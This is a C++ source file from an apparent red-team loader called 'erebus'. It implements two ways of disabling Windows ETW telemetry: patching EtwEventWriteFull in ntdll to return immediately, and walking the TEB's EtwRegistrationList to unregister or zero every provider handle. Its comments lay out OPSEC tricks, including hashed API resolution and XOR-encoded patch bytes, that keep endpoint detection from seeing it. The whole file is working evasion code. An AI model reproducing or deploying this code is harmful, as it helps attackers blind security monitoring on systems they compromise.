/**
 * @file etw_bypass.cpp
 * @brief Expanded ETW bypass variants (Type 2 and Type 3).
 *
 * Compile-time selected via CONFIG_ETW_BYPASS_TYPE:
 *   2 = PatchEtwEventWriteFull  - nop the full telemetry path that ETW-aware
 *       EDRs hook as an alternative to EtwEventWrite.
 *   3 = UnregisterEtwProviders  - walk the EtwRegistrationList via the TEB
 *       (offset 0x1788 on x64 Win10+) and call EtwEventUnregister on every
 *       handle, permanently silencing all user-mode ETW from this process.
 *
 * OPSEC notes:
 *   - Module and export names resolved exclusively through ImportModule() /
 *     ImportFunction() (hashed FNV-1a), so no sensitive strings in .rdata.
 *   - Protection flips use FlipProtection() (NtProtectVirtualMemory).
 *   - Patch byte arrays are XOR-encoded with CONFIG_PATCH_XOR_KEY and
 *     decoded into a stack-resident buffer at runtime.
 *   - EtwEventUnregister is resolved by hash; the string never appears
 *     contiguously in the binary.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/evasion_utils.hpp"
#include "../../include/evasion/evasion.hpp"
#include "../../include/evasion/etw_bypass.hpp"
#include "../../include/evasion/syscall_backend.hpp"
#include "../../include/config.hpp"

namespace erebus {
namespace evasion {

    // ------------------------------------------------------------------
    // Internal: decode a XOR-obfuscated patch array into a stack buffer.
    // ------------------------------------------------------------------
    static inline void DecodePatchEtw(const BYTE* encoded, BYTE* out, SIZE_T len)
    {
        for (SIZE_T i = 0; i < len; i++)
            out[i] = encoded[i] ^ (BYTE)CONFIG_PATCH_XOR_KEY;
    }

    // ------------------------------------------------------------------
    // Type 2: PatchEtwEventWriteFull
    //
    // EtwEventWriteFull is an undocumented ntdll export that many EDRs hook
    // in addition to EtwEventWrite because it carries the full event payload
    // (including TraceLogging and manifest-based providers) before the data
    // is handed to the kernel ETW layer. Patching it with `xor eax, eax; ret`
    // returns STATUS_SUCCESS (0) without writing any event record.
    // ------------------------------------------------------------------

    BOOL PatchEtwEventWriteFull()
    {
        HMODULE hNtdll = ImportModule("ntdll.dll");
        if (!hNtdll)
        {
            LOG_ERROR("Failed to get ntdll.dll for PatchEtwEventWriteFull");
            return FALSE;
        }

        typedef ULONG (WINAPI *typeEtwEventWriteFull)(
            ULONGLONG RegHandle,
            PVOID     EventDescriptor,
            USHORT    EventProperty,
            LPCGUID   ActivityId,
            LPCGUID   RelatedActivityId,
            ULONG     UserDataCount,
            PVOID     UserData
        );
        ImportFunction(hNtdll, EtwEventWriteFull, typeEtwEventWriteFull);
        if (!EtwEventWriteFull)
        {
            // EtwEventWriteFull may not be exported on all Windows builds;
            // treat absence as non-fatal (the primary PatchEtw() already
            // covers EtwEventWrite).
            LOG_INFO("EtwEventWriteFull not found, skipping");
            return TRUE;
        }

        // XOR-encoded `xor eax, eax; ret` (3 bytes).
        // Plaintext:  0x33 0xC0 0xC3
        static const BYTE kEncoded[] = {
            (BYTE)(0x33 ^ CONFIG_PATCH_XOR_KEY),
            (BYTE)(0xC0 ^ CONFIG_PATCH_XOR_KEY),
            (BYTE)(0xC3 ^ CONFIG_PATCH_XOR_KEY)
        };

        BYTE patch[3];
        DecodePatchEtw(kEncoded, patch, sizeof(patch));

        ULONG oldProtect = 0;
        if (!FlipProtection((LPVOID)EtwEventWriteFull, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        {
            LOG_ERROR("NtProtectVirtualMemory failed on EtwEventWriteFull");
            return FALSE;
        }

        RtlCopyMemory((LPVOID)EtwEventWriteFull, patch, sizeof(patch));

        ULONG dummy = 0;
        FlipProtection((LPVOID)EtwEventWriteFull, sizeof(patch), oldProtect, &dummy);

        LOG_SUCCESS("ETW patched (EtwEventWriteFull -> xor eax,eax; ret)");
        return TRUE;
    }

    // ------------------------------------------------------------------
    // Type 3: UnregisterEtwProviders
    //
    // The NT loader maintains a doubly-linked list of ETW_REGISTRATION_ENTRY
    // structures for every provider registered in the current process. On
    // x64 Windows 10/11 (build 10586+) the list head is stored in the TEB
    // at a fixed offset.
    //
    // TEB layout (x64, Windows 10 1511+):
    //   offset 0x1788  LIST_ENTRY  EtwRegistrationList
    //
    // Each ETW_REGISTRATION_ENTRY (simplified, sufficient for our use):
    //   offset 0x00  LIST_ENTRY  List
    //   offset 0x10  REGHANDLE   RegHandle   (64-bit registration handle)
    //
    // We walk the list and call EtwEventUnregister(RegHandle) for each entry.
    // After unregistration the handle is invalid - subsequent EtwEventWrite
    // calls from any instrumented code in this process silently fail with
    // ERROR_INVALID_HANDLE without reaching the kernel consumer.
    //
    // Fallback: if EtwEventUnregister is not resolvable (unusual), we zero
    // the RegHandle in-place which has the same effect on callers that cache
    // the handle but does not flush kernel-side state.
    // ------------------------------------------------------------------

#ifdef _WIN64
    // Byte offset of EtwRegistrationList (LIST_ENTRY) in the x64 TEB.
    // Validated against ntdll symbols on Win10 builds 10586 through 22H2.
    static const ULONG_PTR kEtwRegListTebOffset = 0x1788;

    // Byte offset of the REGHANDLE within ETW_REGISTRATION_ENTRY.
    static const ULONG_PTR kRegHandleOffset     = 0x10;
#endif

    BOOL UnregisterEtwProviders()
    {
#ifndef _WIN64
        // The TEB offset is well-known only for x64; skip silently on x86
        // (32-bit loaders are uncommon in modern red-team tooling).
        LOG_INFO("UnregisterEtwProviders: x86 TEB walk not implemented, skipping");
        return TRUE;
#else
        HMODULE hNtdll = ImportModule("ntdll.dll");
        if (!hNtdll)
        {
            LOG_ERROR("Failed to get ntdll.dll for UnregisterEtwProviders");
            return FALSE;
        }

        // EtwEventUnregister (ntdll export) - resolved by hash.
        typedef ULONG (NTAPI *typeEtwEventUnregister)(ULONGLONG RegHandle);
        ImportFunction(hNtdll, EtwEventUnregister, typeEtwEventUnregister);
        // Non-fatal if absent - we fall back to zeroing handles in-place.

        // Obtain a pointer to the TEB for the current thread.
        // `__readgsqword(0x30)` returns the linear address of the TEB on x64.
        PBYTE teb = (PBYTE)__readgsqword(0x30);
        if (!teb)
        {
            LOG_ERROR("UnregisterEtwProviders: failed to locate TEB");
            return FALSE;
        }

        // EtwRegistrationList is a LIST_ENTRY (Flink / Blink pair).
        LIST_ENTRY* listHead = (LIST_ENTRY*)(teb + kEtwRegListTebOffset);

        // Sanity check: if the list is empty (points to itself) there are
        // no providers to unregister.
        if (listHead->Flink == listHead)
        {
            LOG_INFO("UnregisterEtwProviders: no ETW providers registered");
            return TRUE;
        }

        DWORD unregistered = 0;

        // Walk forward through the circular list.  The loop terminates when
        // we wrap back to the list head.  We capture Flink before each
        // EtwEventUnregister call because unregistration may unlink the
        // current entry.
        LIST_ENTRY* entry = listHead->Flink;
        while (entry && entry != listHead)
        {
            LIST_ENTRY* next = entry->Flink;    // capture before potential unlink

            ULONGLONG* pHandle = (ULONGLONG*)((PBYTE)entry + kRegHandleOffset);
            ULONGLONG   handle = *pHandle;

            if (handle != 0)
            {
                if (EtwEventUnregister)
                {
                    EtwEventUnregister(handle);
                }
                else
                {
                    // Fallback: zero the handle so subsequent EtwEventWrite
                    // calls from code that cached this handle will fail with
                    // ERROR_INVALID_HANDLE at the ntdll level.
                    *pHandle = 0;
                }
                unregistered++;
            }

            entry = next;
        }

        if (unregistered > 0)
            LOG_SUCCESS("ETW providers unregistered from process");
        else
            LOG_INFO("UnregisterEtwProviders: no active handles found");

        return TRUE;
#endif // _WIN64
    }

} // namespace evasion
} // namespace erebus
